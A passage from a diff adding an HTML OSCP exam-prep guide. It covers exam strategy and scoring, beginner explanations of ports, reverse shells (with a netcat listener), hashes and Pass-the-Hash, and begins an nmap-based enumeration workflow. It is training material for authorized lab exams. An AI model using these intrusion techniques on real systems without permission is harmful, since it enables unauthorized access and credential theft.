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" alt="Anshuman Jha">
+  <div class="author-info">
+    <div class="author-label">// Author &amp; Maintainer</div>
+    <div class="author-name">Anshuman Jha</div>
+    <div class="author-role">OSCP &middot; Penetration Tester &amp; Bug Bounty Hunter</div>
+    <div class="author-links">
+      <a class="li" href="https://www.linkedin.com/in/anshuman-jha-86bbb9202/" target="_blank" rel="noopener">
+        <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M20.45 20.45h-3.56v-5.57c0-1.33-.02-3.04-1.85-3.04-1.85 0-2.13 1.45-2.13 2.94v5.67H9.35V9h3.42v1.56h.05c.48-.9 1.64-1.85 3.37-1.85 3.6 0 4.27 2.37 4.27 5.46v6.28zM5.34 7.43a2.07 2.07 0 1 1 0-4.14 2.07 2.07 0 0 1 0 4.14zM7.12 20.45H3.55V9h3.57v11.45zM22.22 0H1.77C.79 0 0 .77 0 1.73v20.54C0 23.23.79 24 1.77 24h20.45c.98 0 1.78-.77 1.78-1.73V1.73C24 .77 23.2 0 22.22 0z"/></svg>
+        LinkedIn
+      </a>
+      <a href="https://github.com/anshu19981" target="_blank" rel="noopener">
+        <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M12 .3a12 12 0 0 0-3.8 23.4c.6.1.8-.3.8-.6v-2c-3.3.7-4-1.6-4-1.6-.5-1.4-1.3-1.8-1.3-1.8-1.1-.7.1-.7.1-.7 1.2.1 1.8 1.2 1.8 1.2 1.1 1.8 2.8 1.3 3.5 1 .1-.8.4-1.3.8-1.6-2.7-.3-5.5-1.3-5.5-5.9 0-1.3.5-2.4 1.2-3.2 0-.3-.5-1.5.2-3.2 0 0 1-.3 3.3 1.2a11.5 11.5 0 0 1 6 0c2.3-1.5 3.3-1.2 3.3-1.2.7 1.7.2 2.9.1 3.2.8.8 1.2 1.9 1.2 3.2 0 4.6-2.8 5.6-5.5 5.9.4.4.8 1.1.8 2.2v3.3c0 .3.2.7.8.6A12 12 0 0 0 12 .3z"/></svg>
+        GitHub
+      </a>
+    </div>
+  </div>
+</div>
+
+
+<div class="warning-banner">
+  ⚠ <strong>ASSUMED BREACH — AD Set:</strong> Credentials are provided at exam start. You begin as a low-privilege domain user. Enumerate immediately with those creds.
+</div>
+
+<div class="callout learn">
+  <span class="learn-tag">▶ Start Here</span>
+  <p><strong>New to OSCP? Read this first.</strong> This page is a <em>map</em>, not a script. The OSCP exam never reuses the exact same box, so memorising commands won't pass you — understanding <em>when and why</em> to run them will. Use it like this:</p>
+  <p><strong>1. Learn the flow, then the commands.</strong> Every section follows the same loop: <code>Enumerate → Find a weakness → Get a foothold → Escalate → Loot → Pivot</code>. Internalise that loop and the individual commands become obvious.</p>
+  <p><strong>2. Enumeration is 80% of the work.</strong> Most students fail not because an exploit is hard, but because they missed something during enumeration. When you feel stuck, you almost always need <em>more enumeration</em>, not a more advanced exploit.</p>
+  <p><strong>3. Replace the placeholders.</strong> Anything in <code>&lt;ANGLE_BRACKETS&gt;</code> is a value <em>you</em> fill in (an IP, a username, a hash). Never paste a command blindly.</p>
+  <p><strong>4. Build the habit before exam day.</strong> Practise this exact methodology on practice boxes (HTB, PG Practice, PEN-200 labs) until it's muscle memory. Stuck for &gt;30&nbsp;min? Jump to <a href="#s16" style="color:#c9b0ff;">Section 16 — When You're Stuck</a>.</p>
+</div>
+
+<!-- ═══════════════════ S0 — CONCEPTS 101 (beginner only) ═══════════════════ -->
+<section class="section beginner-only" id="s0">
+  <div class="section-header">
+    <span class="section-num">00</span>
+    <h2>Concepts 101 — Start Here If You're New</h2>
+  </div>
+
+  <div class="callout learn">
+    <span class="learn-tag">▶ Read this if hacking is new to you</span>
+    <p>The rest of this guide assumes you know the basics. This section builds that foundation from <strong>zero</strong> — plain English, real-world analogies, and simple diagrams. Once these eight ideas click, every command later will make sense. <em>(Already comfortable? Flip to <strong>⚡ Exam Mode</strong> top-right and this whole section disappears.)</em></p>
+  </div>
+
+  <!-- 1. THE BIG PICTURE -->
+  <div class="concept-card">
+    <h4><span class="ico">🎯</span> 1. What does "hacking a machine" actually mean?</h4>
+    <p>Your goal is simple: get the computer to <strong>run your commands</strong>, then become its most powerful user (<code>root</code> on Linux, <code>SYSTEM</code> on Windows). Every box you'll ever attack follows the same five-step loop. Memorise this loop — it's the spine of the entire exam.</p>
+    <div class="diagram">
+      <svg viewBox="0 0 620 150" xmlns="http://www.w3.org/2000/svg">
+        <defs>
+          <marker id="ah" markerWidth="9" markerHeight="9" refX="6" refY="3" orient="auto"><path d="M0,0 L6,3 L0,6 Z" fill="var(--accent)"/></marker>
+        </defs>
+        <!-- boxes -->
+        <g>
+          <rect x="6"   y="24" width="104" height="44" rx="7" fill="rgba(0,255,136,0.06)" stroke="var(--accent)" stroke-width="1"/>
+          <rect x="130" y="24" width="104" height="44" rx="7" fill="rgba(0,184,255,0.06)" stroke="var(--accent2)" stroke-width="1"/>
+          <rect x="254" y="24" width="104" height="44" rx="7" fill="rgba(0,184,255,0.06)" stroke="var(--accent2)" stroke-width="1"/>
+          <rect x="378" y="24" width="104" height="44" rx="7" fill="rgba(255,184,0,0.06)" stroke="var(--accent4)" stroke-width="1"/>
+          <rect x="502" y="24" width="104" height="44" rx="7" fill="rgba(255,76,106,0.06)" stroke="var(--accent3)" stroke-width="1"/>
+        </g>
+        <text class="dlabel" x="58"  y="50" text-anchor="middle">Enumerate</text>
+        <text class="dlabel" x="182" y="50" text-anchor="middle">Exploit</text>
+        <text class="dlabel" x="306" y="50" text-anchor="middle">Escalate</text>
+        <text class="dlabel" x="430" y="50" text-anchor="middle">Loot</text>
+        <text class="dlabel" x="554" y="50" text-anchor="middle">Pivot</text>
+        <!-- arrows between -->
+        <line x1="111" y1="46" x2="128" y2="46" stroke="var(--accent)" stroke-width="1.5" marker-end="url(#ah)"/>
+        <line x1="235" y1="46" x2="252" y2="46" stroke="var(--accent)" stroke-width="1.5" marker-end="url(#ah)"/>
+        <line x1="359" y1="46" x2="376" y2="46" stroke="var(--accent)" stroke-width="1.5" marker-end="url(#ah)"/>
+        <line x1="483" y1="46" x2="500" y2="46" stroke="var(--accent)" stroke-width="1.5" marker-end="url(#ah)"/>
+        <!-- loop back -->
+        <path d="M554,70 L554,110 L58,110 L58,72" fill="none" stroke="var(--text-dim)" stroke-width="1.3" stroke-dasharray="4 4" marker-end="url(#ah)"/>
+        <text class="dlabel-sm" x="306" y="126" text-anchor="middle">repeat on every new machine / user you reach</text>
+      </svg>
+      <div class="cap">The loop every box follows — find doors → break in → become admin → steal creds → reach the next machine</div>
+    </div>
+    <p><strong>In one line each:</strong> <em>Enumerate</em> = find everything that's running. <em>Exploit</em> = abuse a weakness to get your first shell. <em>Escalate</em> = go from normal user to admin. <em>Loot</em> = grab passwords &amp; keys. <em>Pivot</em> = use this machine to reach the next one.</p>
+  </div>
+
+  <!-- 2. NETWORKS, IPs, PORTS -->
+  <div class="concept-card">
+    <h4><span class="ico">🌐</span> 2. IP addresses &amp; ports</h4>
+    <p>An <strong>IP address</strong> (like <code>10.10.10.5</code>) is a computer's address on the network — how you find it. A <strong>port</strong> is a numbered doorway <em>on</em> that computer. Each open port runs one <strong>service</strong> (a program waiting for connections). Hacking starts by knocking on every door to see which are open and what's behind them.</p>
+    <div class="diagram">
+      <svg viewBox="0 0 620 230" xmlns="http://www.w3.org/2000/svg">
+        <!-- building -->
+        <rect x="40" y="30" width="150" height="180" rx="6" fill="var(--panel)" stroke="var(--accent2)" stroke-width="1.3"/>
+        <text class="dlabel-bold" x="115" y="58" text-anchor="middle">TARGET</text>
+        <text class="dlabel-sm" x="115" y="76" text-anchor="middle">one IP: 10.10.10.5</text>
+        <!-- doors -->
+        <g>
+          <rect x="175" y="92"  width="30" height="22" rx="3" fill="rgba(0,255,136,0.12)" stroke="var(--accent)"/>
+          <rect x="175" y="122" width="30" height="22" rx="3" fill="rgba(0,255,136,0.12)" stroke="var(--accent)"/>
+          <rect x="175" y="152" width="30" height="22" rx="3" fill="rgba(0,255,136,0.12)" stroke="var(--accent)"/>
+          <rect x="175" y="182" width="30" height="22" rx="3" fill="rgba(92,104,128,0.12)" stroke="var(--text-dim)"/>
+        </g>
+        <!-- labels -->
+        <text class="dlabel"    x="225" y="107" >Port 22  →  SSH</text>
+        <text class="dlabel-sm" x="360" y="107" >remote login</text>
+        <text class="dlabel"    x="225" y="137" >Port 80  →  HTTP</text>
+        <text class="dlabel-sm" x="360" y="137" >a website</text>
+        <text class="dlabel"    x="225" y="167" >Port 445 →  SMB</text>
+        <text class="dlabel-sm" x="360" y="167" >Windows file shares</text>
+        <text class="dlabel-sm" x="225" y="197" >Port 3306 (closed)</text>
+        <text class="dlabel-sm" x="360" y="197" >no service = no way in</text>
+      </svg>
+      <div class="cap">One machine = one address with many numbered doors. Each open door is a potential way in.</div>
+    </div>
+    <div class="analogy"><b>Think of it like an apartment building.</b> The street address is the <b>IP</b>. Each flat number is a <b>port</b>. Behind flat #80 lives the website, behind #22 lives remote login. A burglar tries every door first — that's <b>enumeration</b>.</div>
+  </div>
+
+  <!-- 3. CLIENT & SERVER -->
+  <div class="concept-card">
+    <h4><span class="ico">💬</span> 3. Client &amp; server — how machines talk</h4>
+    <p>A <strong>server</strong> is a program that waits and answers requests (a website, a database). A <strong>client</strong> is whoever asks (your browser, a tool). When you open a site, your browser (client) asks the web server on port 80/443, and the server replies. Almost every service you'll attack is a server waiting for input — and bad input is how you break in.</p>
+    <div class="analogy"><b>Think of it like a restaurant.</b> You (client) place an order; the kitchen (server) prepares and sends it back. A web attack is like slipping a trick note into your order that makes the kitchen do something it shouldn't — like hand you the master keys.</div>
+  </div>
+
+  <!-- 4. WHAT IS A SHELL -->
+  <div class="concept-card">
+    <h4><span class="ico">🐚</span> 4. What is a "shell"?</h4>
+    <p>A <strong>shell</strong> is just a command line <em>on the target machine</em> — once you have one, you can type commands the victim computer will run. Getting that first shell = your <strong>foothold</strong>. The most common type is a <strong>reverse shell</strong>: instead of you connecting in (firewalls block that), you trick the target into connecting <em>out</em> to you.</p>
+    <div class="diagram">
+      <svg viewBox="0 0 620 190" xmlns="http://www.w3.org/2000/svg">
+        <defs>
+          <marker id="ah2" markerWidth="10" markerHeight="10" refX="7" refY="3.5" orient="auto"><path d="M0,0 L7,3.5 L0,7 Z" fill="var(--accent3)"/></marker>
+        </defs>
+        <rect x="30" y="55" width="180" height="80" rx="8" fill="rgba(0,255,136,0.05)" stroke="var(--accent)" stroke-width="1.3"/>
+        <text class="dlabel-bold" x="120" y="85" text-anchor="middle">YOU (Kali)</text>
+        <text class="dlabel-sm"   x="120" y="105" text-anchor="middle">listener: nc -lvnp 4444</text>
+        <text class="dlabel-sm"   x="120" y="121" text-anchor="middle">waiting…</text>
+
+        <rect x="410" y="55" width="180" height="80" rx="8" fill="rgba(255,76,106,0.05)" stroke="var(--accent3)" stroke-width="1.3"/>
+        <text class="dlabel-bold" x="500" y="85" text-anchor="middle">TARGET</text>
+        <text class="dlabel-sm"   x="500" y="105" text-anchor="middle">runs your payload,</text>
+        <text class="dlabel-sm"   x="500" y="121" text-anchor="middle">dials home →</text>
+
+        <line x1="408" y1="95" x2="214" y2="95" stroke="var(--accent3)" stroke-width="1.8" marker-end="url(#ah2)"/>
+        <text class="dlabel-sm" x="311" y="80" text-anchor="middle">shell connects back on port 4444</text>
+        <text class="dlabel-sm" x="311" y="160" text-anchor="middle" fill="var(--accent)">✓ outbound connections sail through most firewalls</text>
+      </svg>
+      <div class="cap">Reverse shell: the victim connects to you, so inbound firewall rules don't stop it.</div>
+    </div>
+    <div class="analogy"><b>Think of it like a phone call.</b> You can't call <em>into</em> a locked office (firewall). So you leave a note that says "call this number." When the target calls <em>you</em>, you're connected — and now you can talk (run commands).</div>
+  </div>
+
+  <!-- 5. LINUX VS WINDOWS -->
+  <div class="concept-card">
+    <h4><span class="ico">🖥️</span> 5. Linux vs Windows — the two worlds</h4>
+    <p>OSCP boxes are either Linux or Windows, and the "god user" is named differently on each. Everything else — the loop — stays the same.</p>
+    <div class="table-wrap">
+      <table>
+        <thead><tr><th></th><th>Linux</th><th>Windows</th></tr></thead>
+        <tbody>
+          <tr><td>Top admin user</td><td><code>root</code></td><td><code>SYSTEM</code> / Administrator</td></tr>
+          <tr><td>You'll often start via</td><td>a web app on port 80</td><td>SMB (445), RDP, or AD creds</td></tr>
+          <tr><td>Where passwords hide</td><td><code>/etc/shadow</code>, config files</td><td>SAM, LSASS memory, AD database</td></tr>
+          <tr><td>Privilege-escalation hunt</td><td>sudo, SUID, cron</td><td>tokens, services, AD misconfigs</td></tr>
+        </tbody>
+      </table>
+    </div>
+    <p>The AD (Active Directory) set is just <em>multiple Windows machines</em> managed by one central server. Own that server and you own them all — covered fully in Section 5.</p>
+  </div>
+
+  <!-- 6. FILE PERMISSIONS -->
+  <div class="concept-card">
+    <h4><span class="ico">🔑</span> 6. Linux file permissions (rwx)</h4>
+    <p>On Linux, every file says <em>who</em> can <strong>r</strong>ead, <strong>w</strong>rite, and e<strong>x</strong>ecute it — split into three groups: the <strong>owner</strong>, the <strong>group</strong>, and <strong>everyone else</strong>. Misconfigured permissions (e.g. a root-owned script <em>you</em> can write to) are a classic way to escalate to root.</p>
+    <div class="diagram">
+      <svg viewBox="0 0 620 150" xmlns="http://www.w3.org/2000/svg">
+        <text x="310" y="42" text-anchor="middle" style="font-family:'JetBrains Mono',monospace;font-size:34px;font-weight:700;" fill="var(--accent)">rwx&#160;&#160;r-x&#160;&#160;r--</text>
+        <rect x="150" y="14" width="86" height="44" rx="5" fill="none" stroke="var(--accent)" stroke-width="1"/>
+        <rect x="268" y="14" width="86" height="44" rx="5" fill="none" stroke="var(--accent2)" stroke-width="1"/>
+        <rect x="386" y="14" width="86" height="44" rx="5" fill="none" stroke="var(--text-dim)" stroke-width="1"/>
+        <text class="dlabel-sm" x="193" y="78" text-anchor="middle">OWNER</text>
+        <text class="dlabel-sm" x="311" y="78" text-anchor="middle">GROUP</text>
+        <text class="dlabel-sm" x="429" y="78" text-anchor="middle">OTHERS</text>
+        <text class="dlabel-sm" x="193" y="94" text-anchor="middle">read+write+run</text>
+        <text class="dlabel-sm" x="311" y="94" text-anchor="middle">read+run</text>
+        <text class="dlabel-sm" x="429" y="94" text-anchor="middle">read only</text>
+        <text class="dlabel-sm" x="310" y="128" text-anchor="middle">r = read   ·   w = write/modify   ·   x = execute/run</text>
+      </svg>
+      <div class="cap">If a file root runs is writable by you (w in the wrong place), you can make it run your code as root.</div>
+    </div>
+  </div>
+
+  <!-- 7. HASHING -->
+  <div class="concept-card">
+    <h4><span class="ico">#️⃣</span> 7. What is a hash?</h4>
+    <p>Systems never store your real password — they store a <strong>hash</strong>: a scrambled fingerprint of it. Hashing is <strong>one-way</strong>: easy to turn "password123" into a hash, practically impossible to turn the hash back into "password123". So "cracking" doesn't reverse anything — you guess millions of passwords, hash each guess, and look for a match.</p>
+    <div class="analogy"><b>Think of it like a blender.</b> Throw in a fruit and you always get the exact same smoothie — but you can't un-blend the smoothie back into the fruit. To find what went in, you blend fruits one by one until a smoothie matches. That's password cracking with <code>hashcat</code>.</div>
+    <p>Two routes you'll use constantly: <strong>steal a hash</strong> → crack it offline (fast, silent); or <strong>steal a hash</strong> → just <em>log in with the hash itself</em> on Windows (Pass-the-Hash — no cracking needed). Both are in Section 8.</p>
+  </div>
+
+  <!-- 8. WRAP -->
+  <div class="concept-card">
+    <h4><span class="ico">🚀</span> 8. You're ready — here's the map</h4>
+    <p>That's the whole foundation. From here, the guide just applies the loop in detail: <strong>Section 2</strong> teaches enumeration (finding the doors), <strong>Sections 3–4</strong> attack standalone Linux/Windows boxes, <strong>Section 5</strong> is the Active Directory chain, and the rest are specialist tools (pivoting, password attacks, shells). Whenever a word confuses you, the <a href="#s15" style="color:#c9b0ff;">Glossary (Section 15)</a> has it in plain English, and if you freeze, <a href="#s16" style="color:#c9b0ff;">Section 16</a> tells you what to do.</p>
+    <div class="callout green" style="margin-top:14px;">
+      <strong>✓ Next step:</strong> keep reading top-to-bottom in Beginner Mode. Once the commands feel familiar, switch to <strong>⚡ Exam Mode</strong> and use this same page as a fast, no-fluff command reference during practice.
+    </div>
+  </div>
+
+  <a href="#top" class="back-top">↑ Back to top</a>
+</section>
+
+<!-- ═══════════════════ TOC ═══════════════════ -->
+<nav class="toc">
+  <div class="toc-title">// Table of Contents</div>
+  <ol>
+    <li class="beginner-only"><a href="#s0">Concepts 101 — Start Here If You're New</a></li>
+    <li><a href="#s1">Exam Structure &amp; Strategy</a></li>
+    <li><a href="#s2">Universal Enumeration Framework</a></li>
+    <li><a href="#s3">Standalone Linux Box Methodology</a></li>
+    <li><a href="#s4">Standalone Windows Box Methodology</a></li>
+    <li><a href="#s5">Active Directory Attack Chains</a></li>
+    <li><a href="#s6">MSSQL — RCE &amp; Lateral Movement</a></li>
+    <li><a href="#s7">Pivoting &amp; Tunneling</a></li>
+    <li><a href="#s8">Password Attacks</a></li>
+    <li><a href="#s9">File Transfer Cheatsheet</a></li>
+    <li><a href="#s10">Shells &amp; Upgrades</a></li>
+    <li><a href="#s11">Common CVEs &amp; Exploits</a></li>
+    <li><a href="#s12">Exam Day Tips</a></li>
+    <li><a href="#s13">Proof Collection Checklist</a></li>
+    <li><a href="#s14">Quick Reference Card</a></li>
+    <li><a href="#s15">Glossary — Key Terms for Beginners</a></li>
+    <li><a href="#s16">When You're Stuck — Troubleshooting</a></li>
+  </ol>
+</nav>
+
+<!-- ═══════════════════ S1 ═══════════════════ -->
+<section class="section" id="s1">
+  <div class="section-header">
+    <span class="section-num">01</span>
+    <h2>Exam Structure &amp; Strategy</h2>
+  </div>
+
+  <div class="callout learn">
+    <span class="learn-tag">The exam in 60 seconds</span>
+    <p><strong>OSCP is a 24-hour hands-on hacking exam, not a multiple-choice test.</strong> You get 6 machines: 3 standalone boxes + 1 Active Directory set of 3 machines. You must hack into them and prove it by capturing flag files (<code>local.txt</code> and <code>proof.txt</code>).</p>
+    <p><strong>You need 70 / 100 points to pass.</strong> After the 24-hour hacking window, you get a second 24 hours to write a professional report documenting exactly how you broke in. <em>No report = automatic fail, even with 100 points.</em></p>
+    <p><strong>Strategy that passes:</strong> do the AD set first (40 guaranteed points if you follow the chain), then pick off standalones. The point breakdown below shows exactly where every point comes from.</p>
+  </div>
+
+  <h3>Point Breakdown</h3>
+  <div class="points-grid">
+    <div class="point-card">
+      <div class="label">AD Set Total</div>
+      <div class="pts">40 pts</div>
+    </div>
+    <div class="point-card">
+      <div class="label">MS01 — local.txt</div>
+      <div class="pts blue">10 pts</div>
+      <div class="sublabel">Entry point (provided creds)</div>
+    </div>
+    <div class="point-card">
+      <div class="label">MS02 — local.txt</div>
+      <div class="pts blue">10 pts</div>
+      <div class="sublabel">Pivot via MS01</div>
+    </div>
+    <div class="point-card">
+      <div class="label">DC01 — proof.txt</div>
+      <div class="pts yellow">20 pts</div>
+      <div class="sublabel">Requires DA / SYSTEM</div>
+    </div>
+    <div class="point-card">
+      <div class="label">Each Standalone</div>
+      <div class="pts">20 pts</div>
+      <div class="sublabel">local.txt=10 + proof.txt=10</div>
+    </div>
+    <div class="point-card" style="border-color:rgba(0,255,136,0.3);">
+      <div class="label">Pass Threshold</div>
+      <div class="pts" style="font-size:32px;">70</div>
+      <div class="sublabel">out of 100 pts</div>
+    </div>
+  </div>
+
+  <h3>Time Strategy (23h 45min)</h3>
+  <pre data-lang="timeline"><code>Hour 0-0:30    Setup: VPN, loot dirs, /etc/hosts, nmap ALL targets in parallel
+Hour 0:30-4    ATTACK AD SET FIRST — 40 pts guaranteed path
+               ├── Enumerate with provided creds (BloodHound, nxc, LDAP)
+               ├── Low-hanging fruit: Kerberoast, AS-REP, descriptions, shares
+               ├── Lateral MS01 → MS02 → DC
+               └── Screenshot every proof immediately
+Hour 4-8       Standalone Box 1 (pick easiest from nmap)
+Hour 8-13      Standalone Box 2
+Hour 13-18     Standalone Box 3
+Hour 18-22     Revisit stuck machines with fresh eyes
+Hour 22-23     Final screenshots, verify all proofs, report notes</code></pre>
+
+  <h3>Minimum Pass Scenarios</h3>
+  <div class="scenario-grid">
+    <div class="scenario">
+      <div class="sc-label">Scenario A — Recommended</div>
+      <div class="sc-pts">80 pts ✓</div>
+      <div class="sc-desc">Full AD (40) + 2 full standalones (40)</div>
+    </div>
+    <div class="scenario">
+      <div class="sc-label">Scenario B</div>
+      <div class="sc-pts">70 pts ✓</div>
+      <div class="sc-desc">Full AD (40) + 1 full (20) + 1 local.txt (10)</div>
+    </div>
+    <div class="scenario">
+      <div class="sc-label">Scenario C</div>
+      <div class="sc-pts">70 pts ✓</div>
+      <div class="sc-desc">Full AD (40) + 2×local.txt (20) + 1 root (10)</div>
+    </div>
+    <div class="scenario">
+      <div class="sc-label">Scenario D — No AD</div>
+      <div class="sc-pts">70 pts ✓</div>
+      <div class="sc-desc">3 full standalones (60) + AD partial (10)</div>
+    </div>
+  </div>
+
+  <h3>Metasploit Rule</h3>
+  <pre data-lang="rule"><code>✓ msfvenom      → use freely on ALL machines (payload gen only)
+✓ Metasploit    → EXACTLY 1 machine — choose wisely
+✗ Metasploit    → CANNOT use on more than 1 machine
+✓ Manual exploits → unlimited</code></pre>
+
+  <a href="#top" class="back-top">↑ Back to top</a>
+</section>
+
+<!-- ═══════════════════ S2 ═══════════════════ -->
+<section class="section" id="s2">
+  <div class="section-header">
+    <span class="section-num">02</span>
+    <h2>Universal Enumeration Framework</h2>
+  </div>
+
+  <div class="callout learn">
+    <span class="learn-tag">Why this matters</span>
+    <p><strong>Enumeration = finding doors before you try to kick them in.</strong> The goal here is to build a complete picture of the target: what ports are open, what software is running, and what versions. Each open port is a potential way in.</p>
+    <p><strong>The #1 student mistake:</strong> running one quick <code>nmap</code> scan, seeing port 80, and tunnel-visioning on the website for 3 hours — while the real foothold was a forgotten anonymous FTP on port 21. <em>Scan everything (all 65,535 ports + UDP top 20) before you commit to any one path.</em></p>
+    <p><strong>Golden rule:</strong> for every service you find, ask three questions — <em>What version is it? Are there known exploits (<code>searchsploit</code>)? Can I log in with default/blank/anonymous creds?</em></p>
+  </div>
+
+  <h3>Initial Recon — Run in Parallel</h3>
+  <pre data-lang="bash"><code># Setup workspace
+mkdir -p ~/exam/{ad,box1,box2,box3}/{scans,loot,exploits,screenshots}
+
+# Parallel quick scans on ALL targets:
+for ip in &lt;MS01_IP&gt; &lt;MS02_IP&gt; &lt;DC_IP&gt; &lt;BOX1_IP&gt; &lt;BOX2_IP&gt; &lt;BOX3_IP&gt;; do
+    nmap -sV --open -T4 $ip -oN ~/exam/scans/quick_$ip.txt &amp;
+done; wait
+
+# Full TCP per machine:
+nmap -p- -sV -sC --open -T4 &lt;TARGET_IP&gt; -oN full_tcp.txt
+
+# UDP top 20 — DON'T SKIP (SNMP/TFTP/DNS often critical):
+nmap -sU --top-ports 20 &lt;TARGET_IP&gt; -oN udp.txt</code></pre>
+
+  <h3>Port → Action Decision Table</h3>
+  <div class="table-wrap">
+    <table>
+      <thead><tr><th>Port</th><th>Service</th><th>Immediate Action</th></tr></thead>
+      <tbody>
+        <tr><td>21</td><td>FTP</td><td><span class="action">ftp &lt;IP&gt; (try anonymous:anonymous); check version → searchsploit</span></td></tr>
+        <tr><td>22</td><td>SSH</td><td><span class="action">Note version; use creds found later; id_rsa files?</span></td></tr>
+        <tr><td>25</td><td>SMTP</td><td><span class="action">smtp-user-enum; check open relay</span></td></tr>
+        <tr><td>53</td><td>DNS</td><td><span class="action">dig axfr @&lt;IP&gt; &lt;domain&gt;; dnsrecon zone transfer</span></td></tr>
+        <tr><td>80/443</td><td>HTTP/S</td><td><span class="action">→ Full web enumeration workflow below</span></td></tr>
+        <tr><td>88</td><td>Kerberos</td><td><span class="impact">AD confirmed! AS-REP roast immediately</span></td></tr>
+        <tr><td>111</td><td>RPC/NFS</td><td><span class="action">showmount -e &lt;IP&gt;; mount + explore</span></td></tr>
+        <tr><td>139/445</td><td>SMB</td><td><span class="action">→ SMB enumeration section below</span></td></tr>
+        <tr><td>161 UDP</td><td>SNMP</td><td><span class="action">snmpwalk -c public -v1; onesixtyone brute</span></td></tr>
+        <tr><td>389/636</td><td>LDAP</td><td><span class="action">ldapsearch anonymous; AD enumeration</span></td></tr>
